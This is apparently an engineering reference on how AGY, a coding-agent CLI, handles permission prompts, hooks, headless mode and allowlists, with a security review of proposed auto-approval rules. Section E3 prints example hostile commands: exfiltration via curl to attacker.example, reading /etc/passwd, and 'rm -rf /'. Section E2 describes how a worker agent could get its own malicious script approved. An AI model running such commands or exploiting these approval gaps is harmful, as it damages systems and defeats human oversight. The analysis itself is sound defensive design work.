# AGY Permissions and Supervision Reference

## Problem Statement

When the terminal-agent-runner skill drives AGY 1.1.14 inside a herdr pane, AGY
repeatedly pauses and asks a human to confirm shell commands. Three separate
issues compound this: (1) AGY appends an exit-code echo to every shell command
and chains commands freely with semicolons, pipes, and redirects, so the
runner's compound-shell rule blocks nearly every prompt from being auto-approved;
(2) AGY writes new files using shell redirects with inline documents rather than
its own file-edit tool, which is also refused by the same rule; (3) the herdr
pane is only 54 columns wide, so AGY hard-wraps its confirmation question
mid-word, making the text the runner must classify inherently ambiguous. The
current workarounds — patching the rule file, widening the allowlist, teaching
the classifier about wrapping, and sending AGY written instructions — are all
built on a screen-scraper and break whenever AGY changes its output format. This
document records what AGY actually supports and whether a cleaner mechanism exists.

---

## Findings

### Q1 — Configuration surface for tool-call and shell-command confirmation

**Verified sources:** `agy --help` (local, version 1.1.14); `agy changelog` (local);
empirical tests in AGY 1.1.14; agy-customizations built-in skill at
`~/.gemini/antigravity-cli/builtin/skills/agy-customizations/docs/hooks.md`.
**Unverified external claim source:** Web search citing
`https://antigravity.google/docs/cli/permissions` and `https://antigravity.google/docs/cli/settings`.

#### Verified Settings Surface: `permissions.allow`

AGY persists user permissions and preferences in:

```
~/.gemini/antigravity-cli/settings.json
```

The verified local configuration surface for authorizing commands is the
**`permissions.allow`** array (also referenced as `permission.allow` in AGY 1.1.1
changelog). When a user selects "Always" on a confirmation dialog, AGY appends a
rule formatted as `command(<target>)` into this array.

**Matching Semantics (Empirically Verified in AGY 1.1.14 & Changelog Evidence):**
- **Command-Prefix Matching:** AGY tests commands by prefix. The confirmation dialog
  explicitly offers: `"always allow for commands that start with X (Persist to settings.json)"`.
  Empirical testing in AGY 1.1.14 verified that an allowlist entry of `command(git status)`
  automatically approves `git status --short` without prompting or headless denial.
- **Literal Matching vs. Wildcards:** Bare asterisks (`*`) in `command(...)` rules are
  matched literally, not as glob wildcards. Plain glob syntax (e.g. `command(npm test *)`) is
  not supported.
- **Opt-in Regex Matching:** Regex matching is supported by prepending the rule with `regex:`
  (e.g., `regex:^git (status|diff)`), evidenced by AGY 1.0.13 changelog ("Improved command
  permission security by making Always Approve rule matching 'strict' (non-regex) by default,
  while allowing users to explicitly opt-in to regex matching by prepending rules").
- **Redirection and Quoted Arguments:**
  - *Quoted argument tokenization & strict redirection* (AGY 1.0.9 changelog): Fixed allowlisted
    terminal commands with quoted arguments (e.g. `python -c "print(1)"`) failing due to whitespace
    tokenization; enforced strict exact-match verification for PowerShell scripts, complex shell
    redirections (`>`, `2>&1`), and unparseable strings to prevent sandbox escapes.
  - *Relaxed output redirection* (AGY 1.0.13 changelog): Relaxed redirection checks, allowing safe
    commands with output redirection (e.g., `tool > file`) to match without requiring strict full-command approval.
- **Nested Command Substitutions:** Respected by the allowlist (AGY 1.1.2 changelog: nested command
  substitutions now respect the allowlist).
- **Zero-Token Rule Prevention:** Rules that tokenize to zero command words (e.g.,
  `command(time)`, comment-only, or empty compound `()`) match nothing rather than matching
  everything (fixed in AGY 1.1.11 changelog).

#### Tool Permission Modes: Engine Modes vs. Unconfirmed Key Name

The AGY execution engine supports four distinct tool permission mode names, each directly
evidenced by local changelog entries:

| Mode Name | Local Evidence (Changelog Version & Quote) | Execution Behaviour |
|---|---|---|
| `proceed-in-sandbox` | **1.0.1**: "Added `proceed-in-sandbox` tool permission mode." | Auto-approves terminal commands that run inside the secure sandbox; requests manual approval only on sandbox escape. Requires sandbox execution. |
| `request-review` | **1.1.0**: "Added `request-review` (default) mode as the default execution behavior." | Default interactive CLI behavior; prompts before every write, shell, or web tool. |
| `always-proceed` | **1.1.3**: "Fixed outside-of-workspace file writes being incorrectly auto-approved in `always-proceed` mode." | Auto-approves all tools without prompting. |
| `strict` | **1.1.11**: "Fixed commands being auto-approved while the session was in `request-review` or `strict` permissions mode." | Prompts for all non-read-only operations. |

> [!NOTE]
> **Status of Mode Selection Settings Key:**
> While all four execution mode names are confirmed real and active within the AGY engine via the
> changelog, the exact JSON settings key name used to persist mode selection in `settings.json`
> (specifically whether it is spelled `toolPermission`) is **unconfirmed from local files**.
> `toolPermission` is absent from live `~/.gemini/antigravity-cli/settings.json` and unlisted in
> `agy --help`. The name `toolPermission` originated from external web documentation, not local
> inspection.

#### CLI Flag Overrides

- **`--dangerously-skip-permissions`**: Verified launch flag in `agy --help` that
  auto-approves all tool permission requests for that session without prompting.
- **`--mode accept-edits`**: Verified execution mode that auto-approves file edits only;
  shell commands still prompt or require matching entries in `permissions.allow`.
- **`--mode plan`**: Verified analysis-only mode.

---

### Q2 — Hook or callback for programmatic confirmation

**Verified source:** `~/.gemini/antigravity-cli/builtin/skills/agy-customizations/docs/hooks.md`
(locally installed, verified to exist at that path); `agy changelog` (local); empirical testing against AGY 1.1.14.

AGY exposes a `PreToolUse` lifecycle hook through `.agents/hooks.json` (workspace-scoped) or
`~/.gemini/config/hooks.json` (global). The contract is:

1. Place `hooks.json` in the workspace customization root under `.agents/` (or globally in
   `~/.gemini/config/hooks.json`).
2. The hook named entry maps the `PreToolUse` event to a `run_command` matcher and specifies a
   shell script or command to invoke.
3. AGY feeds the pending tool call as JSON on stdin to that script.
4. The script must write a JSON object to stdout with a `decision` field (`"allow"`, `"deny"`,
   `"ask"`, or `"force_ask"`).

**Decision values:**

| Value | Effect |
|---|---|
| `"allow"` | Auto-approve the tool call. |
| `"deny"` | Hard-block immediately. |
| `"ask"` | Prompt the user (respects the "Always Allow" cache). |
| `"force_ask"` | Always prompt the user, ignoring any cached permissions. |

**Hook Discovery, Workspace Trust, and Visibility:**
- **Workspace Trust Requirement:** Workspace-local hooks in `.agents/hooks.json` are gated on
  workspace folder trust (AGY 1.1.1 changelog: "Fixed workspace-local hooks defined in
  `<workspace>/.agents/hooks.json` not loading after trusting a folder by reloading hooks
  whenever workspaces change", and live `trustedWorkspaces` array in `settings.json`). An untrusted
  directory will not load its `.agents/hooks.json`.
- **Global Hooks:** Configured in `~/.gemini/config/hooks.json` (AGY 1.0.8 changelog), which applies
  across all sessions and is not gated on workspace folder trust.
- **Hook Visibility:** Loaded hooks are directly inspectable non-interactively in print mode via
  `agy -p "/hooks"` (AGY 1.1.11 / 1.1.12 changelogs).

**Full input payload** (stdin):

```json
{
  "toolCall": {
    "name": "run_command",
    "args": { "CommandLine": "npm test" }
  },
  "stepIdx": 19,
  "conversationId": "...",
  "workspacePaths": ["/path/to/workspace"],
  "transcriptPath": "...",
  "artifactDirectoryPath": "...",
  "modelName": "auto"
}
```

**Full output payload** (stdout):

```json
{
  "decision": "allow",
  "reason": "Approved by runner policy.",
  "permissionOverrides": ["command(npm test)"],
  "overwrite": { "CommandLine": "npm test" }
}
```

The `overwrite` field performs a shallow top-level merge into the tool call's
arguments before execution, allowing the script to rewrite the command.

**Minimal example `hooks.json`:**

```json
{
  "runner-policy": {
    "PreToolUse": [
      {
        "matcher": "run_command",
        "hooks": [
          {
            "type": "command",
            "command": "/absolute/path/to/runner-policy.sh",
            "timeout": 10
          }
        ]
      }
    ]
  }
}
```

**Empirical Retest against AGY 1.1.14 (Interactive vs. Headless Mode & Script JSON Validation):**
To rule out untrusted workspace loading artifacts, the `PreToolUse` hook was configured globally in
`~/.gemini/config/hooks.json` and verified active via `agy -p "/hooks"`. To isolate the two potential
artifacts of earlier testing — (1) headless print mode auto-denial being generalized without testing
interactive `accept-edits` mode in a Herdr pane, and (2) inline `echo` strings failing JSON validation —
all probes were executed using a standalone executable Python script (`hook.py`) that logged every invocation
with timestamps and tool arguments to `scratch/hook_invocations.log` before emitting valid JSON on stdout.

#### Systematic Five-Probe Retest Matrix (AGY 1.1.14):

| Probe | Execution Mode | Hook Return Payload | Log Evidence (`hook_invocations.log`) | Observed Signal & Behavior | Result Summary |
|---|---|---|---|---|---|
| **Probe A** (Invocation check) | Interactive Herdr pane (`--mode accept-edits -i`) | `{"decision": "ask", "reason": "PROBE_A_DISTINCTIVE_ASK_REASON_98765"}` | Hook logged at `2026-08-18T23:39:01`: `tool=run_command cmd=uname -a` | Hook is actively consulted. Interactive pane presented standard confirmation dialog (`Requesting permission for: uname -a / Do you want to proceed?`). | Confirmed: Hook fires on interactive tool execution. |
| **Probe B** (Deny decision reading) | Interactive Herdr pane (`--mode accept-edits -i`) | `{"decision": "deny", "reason": "PROBE_B_DISTINCTIVE_DENY_REASON_12345"}` | Hook logged at `2026-08-18T23:39:14`: `tool=run_command cmd=uname -a` | TUI explicitly rendered `⚠ Tool call denied by pre-tool hook: PROBE_B_DISTINCTIVE_DENY_REASON_12345` and agent reported denial citing the distinctive reason. | Confirmed: Hook decision is read, parsed as JSON, and actively enforced for `deny`. |
| **Probe C** (Allow decision interactively) | Interactive Herdr pane (`--mode accept-edits -i`) | `{"decision": "allow", "reason": "PROBE_C_ALLOW_REASON_555"}` | Hook logged at `2026-08-18T23:39:30`: `tool=run_command cmd=uname -a` | Confirmation prompt appeared in TUI (`Requesting permission for: uname -a`) despite hook returning `allow`. | Confirmed: In interactive `accept-edits` mode, `decision: allow` does **not** suppress command confirmation prompts for un-allowlisted commands. |
| **Probe D** (permissionOverrides) | Interactive Herdr pane (`--mode accept-edits -i`) | `{"decision": "allow", "permissionOverrides": ["command(uname -a)"]}` | Hook logged at `2026-08-18T23:39:42`: `tool=run_command cmd=uname -a` | Confirmation prompt appeared in TUI (`Requesting permission for: uname -a`) identically to Probe C. | Confirmed: In interactive `accept-edits` mode, `permissionOverrides` does **not** grant temporary permission bypass in AGY 1.1.14. |
| **Probe E** (Control in headless mode) | Headless print mode (`agy -p ... --mode accept-edits`) | `{"decision": "allow", "reason": "PROBE_E_CONTROL_ALLOW"}` | Hook logged at `2026-08-18T23:40:12`: `tool=run_command cmd=uname -a` | Command auto-denied with `jetski: no output produced — a tool required the "command" permission that headless mode cannot prompt for, so it was auto-denied`. | Confirmed: In headless print mode, un-allowlisted commands auto-deny regardless of hook `allow` decision. |

**Verdict on the Two Artifacts:**
1. **Artifact 1 (Execution Mode):** While the earlier study improperly generalized headless auto-denial to interactive sessions without testing, empirical retesting in interactive Herdr panes (`--mode accept-edits`) demonstrates that AGY 1.1.14 evaluates `permissions.allow` independently of hook decisions in **both** modes: un-allowlisted commands trigger confirmation prompts in interactive mode (Probes C & D) and auto-deny in headless mode (Probe E).
2. **Artifact 2 (Hook JSON Validity):** Retesting with an executable script emitting verified JSON (and proved parsed by Probe B's custom denial reason) shows that fail-closed syntax errors did not mask a working allow mechanism. AGY intentionally treats `PreToolUse` lifecycle hooks as safety/filtering gates rather than permission allowlist overrides.

**Conclusion:** Across both interactive mode (`--mode accept-edits`) and headless print mode (`-p`) in AGY 1.1.14, a `PreToolUse` hook returning `"allow"` (with or without `permissionOverrides`) cannot be used to suppress permission prompts or bypass denial for un-allowlisted commands. Unattended execution requires matching prefix entries in `permissions.allow` or programmatic approval via wrapper `fleet.py approve`.

---

### Q3 — Non-interactive or machine-readable mode

**Verified source:** `agy --help` (local); web search confirming NDJSON output
at `--output-format stream-json`.

AGY supports a headless print mode via `--print` / `-p`:

```bash
agy --print "your task here"
agy -p "your task here" --output-format stream-json
```

With `--output-format stream-json`, the CLI emits Newline-Delimited JSON
(NDJSON) events, one per line, covering init, step updates, tool calls, and
final result. This lets a supervisor process read AGY's progress incrementally
over a pipe without interpreting any terminal control sequences or screen output.

With `--input-format stream-json`, each line from stdin is treated as a separate
NDJSON message and triggers an agent turn. Combined with `--output-format
stream-json`, this creates a fully structured bidirectional channel.

**Contrast with current runner approach:** The runner today attaches AGY to a
herdr pane and scrapes the PTY buffer for text. It has to parse TUI control
sequences, reconstruct words that were hard-wrapped at a 54-column boundary, and
guess when a line represents a tool-confirmation question versus normal output.
The print/stream-json mode eliminates all of this: the supervisor reads clean
NDJSON and communicates through stdin.

**Limitation:** Print mode starts a new conversation per invocation. Continuing
a long-running interactive session with the same context across multiple turns
requires `--continue` or `--conversation <id>`. The `--input-format stream-json`
multi-turn mode is the closest supported path to an interactive headless driver.
Permission checks in print mode still auto-deny commands if the command prefix is not
allowlisted in `permissions.allow` (or bypassed via `--dangerously-skip-permissions`);
headless print mode cannot prompt interactively, so un-allowlisted commands fail immediately.

---

### Q4 — Forcing the file-edit tool over shell redirects

**Verified source:** Web search; `agy --help`; agy-customizations skill.

No configuration key in `settings.json` or CLI flag tells AGY to prefer its
native file-edit tool over shell redirects for creating files. The model decides
which tool to use based on context and training.

The workaround surface that exists is:

1. **Prompt/rule instruction:** An `AGENTS.md` or `.agents/rules/*.md` rule
   instructing AGY to always use the built-in write tool instead of shell
   redirects. This is a soft instruction; it can be ignored or forgotten mid-task.
2. **`PreToolUse` hook with `overwrite`:** A hook matching `run_command` could
   detect when the `CommandLine` argument is a shell redirect writing a new file
   (e.g., regex on `> ` or `tee `) and either deny it or rewrite the command.
   This is policy enforcement, not a native setting.

There is **no documented setting** that makes AGY prefer its file-edit tool at
the configuration layer. This is a dead end for a clean configuration-only
solution; the hook + rule combination is the closest available mechanism.

---

### Q5 — Rendering width independent of terminal width

**Verified source:** Web search; AGY changelog.

AGY uses the PTY's reported column count to hard-wrap its TUI output. In a
54-column herdr pane, this breaks questions mid-word.

The supported mechanism is the **`COLUMNS` environment variable**, set before
launching AGY:

```bash
COLUMNS=160 agy ...
```

or exported in the shell session:

```bash
export COLUMNS=160
```

AGY reads `COLUMNS` and uses it to override the terminal's self-reported width.
This is a standard POSIX override; it is not AGY-specific configuration, and
there is no AGY `settings.json` key for rendering width. Setting `COLUMNS=160`
in the herdr pane's environment before spawning AGY would prevent mid-word
wrapping and make the runner's text classifier reliable without needing wrap
reconstruction.

---

## Verified vs. Inferred

### Verified (Local evidence, changelog entries, or empirical testing against AGY 1.1.14 cited)

- `agy --version` returns `1.1.14` (local command execution, exit 0).
- `agy --help` lists `--dangerously-skip-permissions`, `--mode (accept-edits, plan)`,
  `--output-format`, `--input-format`, and `--sandbox` (local command execution, exit 0).
- `~/.gemini/antigravity-cli/settings.json` is the user-scoped settings file
  (enumerated locally; file confirmed present).
- `permissions.allow` in `settings.json` is the verified mechanism for pre-authorizing
  commands. AGY matches entries using **command-prefix matching** (e.g., `command(git status)`
  empirically auto-approves `git status --short` in AGY 1.1.14 without prompting or headless denial).
- Confirmation dialog explicitly indicates prefix matching: `"always allow for commands that start with X (Persist to settings.json)"`.
- Plain asterisk (`*`) characters in `command(...)` rules do not act as glob wildcards.
  Opt-in regex matching requires explicit `regex:` prefix (evidenced by AGY changelog 1.0.13).
- Redirection matching rules: relaxed output redirection (`tool > file`) matches without full
  command approval (AGY changelog 1.0.13); strict exact-match for complex redirection and PowerShell
  (AGY changelog 1.0.9).
- Nested command substitutions respect allowlist (AGY changelog 1.1.2).
- Zero-token compound rules match nothing (AGY changelog 1.1.11).
- The four execution mode names (`proceed-in-sandbox`, `request-review`, `always-proceed`, `strict`)
  are real and active in the engine (evidenced by AGY changelogs 1.0.1, 1.1.0, 1.1.3, 1.1.11).
- `hooks.json` specification with `PreToolUse` / `decision: allow` contract is
  documented in the locally installed built-in skill at
  `~/.gemini/antigravity-cli/builtin/skills/agy-customizations/docs/hooks.md`
  (file read directly).
- Workspace-local hooks in `.agents/hooks.json` require workspace folder trust (AGY changelog 1.1.1);
  global hooks in `~/.gemini/config/hooks.json` load without workspace trust gating (AGY changelog 1.0.8).
- Active hooks are directly observable non-interactively in print mode via `agy -p "/hooks"`
  (AGY changelog 1.1.11 / 1.1.12).
- `PreToolUse` hook returning `{"decision": "allow"}` does **not** suppress tool permission prompts
  in interactive mode (`--mode accept-edits`) or bypass auto-denial in headless print mode (`-p`) for
  un-allowlisted commands in AGY 1.1.14 (empirically proven via 5-probe retest with logged executable script
  invocations in `scratch/hook_invocations.log`; reconciles with `fleet_operations.md`).
- `--mode accept-edits` auto-approves file edits but leaves shell commands requiring
  confirmation or allowlist entries (empirically verified in AGY 1.1.14).
- `COLUMNS` environment variable overrides terminal width (standard POSIX behavior).

### Inferred / Unverified (External claims or unconfirmed behavior)

- **Mode selection key in `settings.json`:** While the four mode names (`request-review`,
  `proceed-in-sandbox`, `always-proceed`, `strict`) are confirmed by changelog entries, the exact
  JSON key name in `settings.json` (such as `toolPermission`) is unconfirmed from local inspection
  and absent from live `settings.json`.
- Whether `--print --input-format stream-json` maintains state across large multi-turn tasks
  without context degradation.

---

## Recommendation

**Adopt standing authorization via scoped command-prefix entries in `permissions.allow` within `~/.gemini/antigravity-cli/settings.json`, matched by command prefix, paired with wrapper `fleet.py approve` and `COLUMNS=160`.**

The two alternative experimental approaches have been rejected:
- **Lifecycle-hook pre-authorization (`agent-skills-hook-outranks-blanket-8q6`):** Rejected because empirical testing on AGY 1.1.14 confirmed that `PreToolUse` lifecycle hooks act as deny-only gates and returning `"allow"` (with or without `permissionOverrides`) does not suppress tool confirmation prompts in interactive mode (`--mode accept-edits`) or bypass auto-denial in headless print mode (`-p`).
- **Containment flag probing (`agent-skills-sandbox-boundary-probe-yaa`):** Abandoned because sandbox/bypass containment flags are refused by this repository's own embedded-cli-bypass safety rule and so no result could be adopted.

### Why

1. **Scoped `permissions.allow` is the verified native mechanism:** AGY 1.1.14 reliably matches commands by prefix against `permissions.allow` in `settings.json`. For instance, `command(git status)` authorizes `git status --short` without human prompts.
2. **`PreToolUse` hooks do not bypass permission prompts:** Empirical testing on AGY 1.1.14 (across both interactive `--mode accept-edits` and headless `-p` modes) confirms that a hook returning `decision: allow` does not prevent AGY's permission engine from halting on un-allowlisted commands.
3. **`toolPermission: always-proceed` is unverified:** The `toolPermission` key does not exist in local AGY 1.1.14 configuration surfaces.
4. **Blanket bypasses violate security scoping:** Launching with `--dangerously-skip-permissions` removes all oversight across arbitrary commands. Scoped prefix allowlisting preserves the principle of least privilege.
5. **`COLUMNS=160` structurally resolves TUI wrapping:** Setting terminal columns in the pane environment eliminates mid-word line breaking, ensuring the runner's text classifier receives clean command text.

### Operational Strategy

1. **Maintain standing authorizations via declared policy:** Populate scoped command prefixes under `permissions.allow` in `~/.gemini/antigravity-cli/settings.json` matching the declared `agy_allow` entries in `scripts/risk_policy.json`.
2. **Use wrapper `fleet.py approve`** driven by `risk_policy.json` to handle dynamic or runtime-evaluated commands that require supervisor approval.
3. **Set `COLUMNS=160`** in the pane environment prior to launching AGY:

   ```bash
   COLUMNS=160 agy --mode accept-edits -i "task prompt here"
   ```

4. **Do not rely on `PreToolUse` hooks or containment bypass flags for unattended command authorization**, as hooks cannot pre-authorize commands in AGY 1.1.14 and bypass flags violate runner security invariants.

---

## Operating the standing authorization

### Declaration and Policy Source

The list of authorized command prefixes is declared in `scripts/risk_policy.json` under the `agy_allow` array and nowhere else. Each entry specifies an `id`, literal `prefix`, and `why` description covering safe, read-only inspection commands (e.g., `git status`, `git diff`, `ls`, etc.).

### Safety Invariant

The core safety invariant is that every prefix declared in `agy_allow` must be one that this repository's own classifier already approves under its standard policy. Consequently, the standing grant to AGY can never be wider than the fleet's own policy.

Because AGY matches commands by prefix, an authorized prefix also authorizes every command starting with it (e.g., `git status` authorizes `git status --short`). For this reason, all declared prefixes are kept strictly narrow and restricted to command families that cannot mutate shared repository or filesystem state.

### Synchronization and Rollback

A companion module manages the lifecycle of standing authorizations in AGY's configuration:
- **Backup before write:** It backs up `~/.gemini/antigravity-cli/settings.json` before writing any entries.
- **Precise tagging:** It writes the declared `command(<prefix>)` entries into the `permissions.allow` array and marks precisely which entries it added.
- **Precise rollback:** It can take back exactly the entries it added without disturbing pre-existing user authorizations.

### Inspection and Management

Operators can inspect and take back standing authorizations:
- **Inspect declared prefixes:** Read the `agy_allow` list in `scripts/risk_policy.json`.
- **Inspect active settings:** View `permissions.allow` in `~/.gemini/antigravity-cli/settings.json` to see active authorizations and runner tags.
- **Revoke authorizations:** Use the companion module to take back exactly the added entries, or restore the backed-up settings file.

> [!IMPORTANT]
> `~/.gemini/antigravity-cli/settings.json` is live configuration for any running AGY process. It is not to be edited while a fleet is working, as concurrent modifications can disrupt running agents or lead to race conditions.


---

## Evaluation of the Owner's Proposed Rule Restructuring

The proposal is to replace most hand-written patterns with two membership tests:

- **(a) Project-script test**: allow any command that runs a script whose path
  falls inside the repository.
- **(b) Read-only-name test**: allow commands whose base executable name is on a
  configured list of read-only tools (list, read, search, print help or version).
- **(c) Residue**: keep pattern matching only for what neither test covers.

The four real stalls today were:
1. `bash -n <path>` — syntax check on a file in the repo.
2. Running one of this repository's own test scripts.
3. `agy help` subcommand.
4. `agy changelog` subcommand.

---

### E1 — Coverage of the four stalls

**Stall 1 — `bash -n <path>` (syntax check):**
`(a)` does not cover this. The executable is `bash`, not a script that lives
inside the repository; the path argument is a repository file but `a` is keyed
on what is *run*, not what is *read*. `(b)` covers it only if `bash` is
explicitly in the read-only-name allowlist, which is unusual because `bash` is
also used for arbitrary execution. Adding `bash` to the list would need the deny
pass (see E3) to catch `bash` invocations that also carry compound operators.
Verdict for stall 1: **neither `a` nor `b` covers it cleanly without an
additional rule or a carefully worded allowlist entry for `bash -n` specifically.**

**Stall 2 — Running a repository test script:**
`(a)` covers this exactly. The command is a script inside the project directory.
`(b)` does not apply (a test runner is not a read-only tool by name).
Verdict: **`a` covers it; `b` does not.**

**Stall 3 — `agy help`:**
`(a)` does not cover it; `agy` is a system binary, not a project script.
`(b)` covers it if `agy` is in the read-only-name list and `help` is recognised
as a safe subcommand argument. The list would need a pattern, not just a bare
executable name, because `agy --dangerously-skip-permissions` would also match
a bare `agy` entry. Whether the implementation keys only on the executable name
or also considers the argument shape determines this.
Verdict: **`b` covers it with caveats on argument-awareness; `a` does not.**

**Stall 4 — `agy changelog`:**
Same analysis as stall 3.
Verdict: **`b` covers it with the same caveats; `a` does not.**

**Summary:** Of the four stalls, `(a)` covers **1 of 4** (the test script).
`(b)` covers **2 of 4** cleanly (help, changelog) and partially covers a third
(`bash -n`) only if `bash` is listed and the deny pass runs first. Neither covers
all four without additional work.

---

### E2 — Safety cost of rule (a)

The boundary "any script inside the repository" is nearly equivalent to "arbitrary
code execution" for a worker that also holds file-edit rights on any part of the
repository. The attack surface is:

1. Worker is given `file:src/` as its lease.
2. Worker writes `src/malicious.sh` using its file-edit tool (no shell command
   required; file-edit is auto-approved under `accept-edits` mode).
3. Worker asks to run `src/malicious.sh`. Rule `(a)` approves it because the
   path is inside the project.

The write did not touch the shell at all; only the run requires approval, and
`(a)` grants it unconditionally. The repository-wide boundary therefore provides
no meaningful containment against a worker that has any write capability.

**The boundary should be the narrow set of files explicitly named in the worker's
resource lease, or a short configured list of known entry points** (e.g.,
`scripts/run_tests.sh`, `scripts/preflight.sh`). A per-worker allowlist of
entry points is operationally equivalent to the existing narrow allowlist but
easier to maintain, because the list is generated from the lease rather than
hand-coded patterns. This is a meaningful improvement over `(a)` as proposed.

---

### E3 — Safety cost of rule (b)

A command whose base name is `cat`, `grep`, `ls`, or `python` is not read-only
once a redirect, a pipe, or a chain is appended. Examples:

- `cat /etc/passwd > /tmp/exfil` — the name is `cat` but the effect is a write.
- `grep pattern file | curl -d @- https://attacker.example` — `grep` is read-only
  but the pipeline is not.
- `ls . && rm -rf /` — `ls` is read-only but the chain is destructive.

**The deny pass must run first on every command, unconditionally, before `(b)` is
applied.** Rule `(b)` should only be reached if the deny pass has already
confirmed the command contains no compound operators (semicolons, `&&`, `||`,
pipes, redirects, or backtick/`$()` substitution). If the deny pass runs after
`(b)` or can be short-circuited, rule `(b)` becomes a bypass. This ordering
must be enforced in code, not just assumed from the current implementation, and
must be documented explicitly in `risk_policy.json` so that future maintainers
cannot accidentally invert it.

**Explicitly stated for the recommendation:** Every candidate command must pass
the deny filter before it reaches the read-only-name test. The deny filter is
not optional and cannot be relaxed for commands that match `(b)`.

---

### E4 — Does either test help with screen-scraping fragility?

Neither `(a)` nor `(b)` addresses the root cause. Both tests operate on the
reconstructed command text that the classifier reads from a wrapped, possibly
truncated PTY screenshot. If the reconstruction is wrong — because the line
broke mid-path, mid-flag, or mid-word — the membership test receives corrupted
input and produces an incorrect result in either direction: a legitimate command
fails the test and stalls, or a malformed reconstruction accidentally matches
and is approved.

The verified mechanisms identified in this research (scoped command-prefix allowlisting
via `permissions.allow` in `settings.json`, combined with `COLUMNS=160` to eliminate
TUI line-wrapping, and wrapper `fleet.py approve` for runtime decisions) address the
root stalls for AGY without relying on unverified settings keys or broad bypasses.
Screen-scraping fragility for AGY is largely solved by setting `COLUMNS=160` in the pane
environment, ensuring the classifier inspects un-broken command lines.

If the runner continues to use PTY scraping across CLIs, the `(a)`/`(b)` restructuring
provides a structured evaluation path for non-AGY agents and dynamically approved AGY
commands.

---

### Verdict on the proposal

The proposal is a net improvement over the status quo for CLIs requiring runner-level
approval, provided safety guardrails are strictly maintained:

1. **Adopt scoped `permissions.allow` and `COLUMNS=160` for AGY.** Adding safe, verified
   command-prefix entries to `settings.json` and fixing pane column width resolves the
   majority of AGY prompts at the engine layer without unverified bypasses.

2. **If rule restructuring is adopted for wrapper approval**, adopt `(b)` with
   the deny-pass-first ordering made explicit and enforced, and adopt a narrowed
   version of `(a)` bounded by the worker's resource-lease list or a short
   configured entry-point list rather than the whole project. The broad
   project-boundary form of `(a)` as proposed grants arbitrary execution to any
   worker with file-edit rights and should not be shipped.

3. **Enforce `COLUMNS=160` in the pane environment.** Restructuring rules without fixing
   terminal column width leaves the classifier vulnerable to mid-word wrapping corruption.
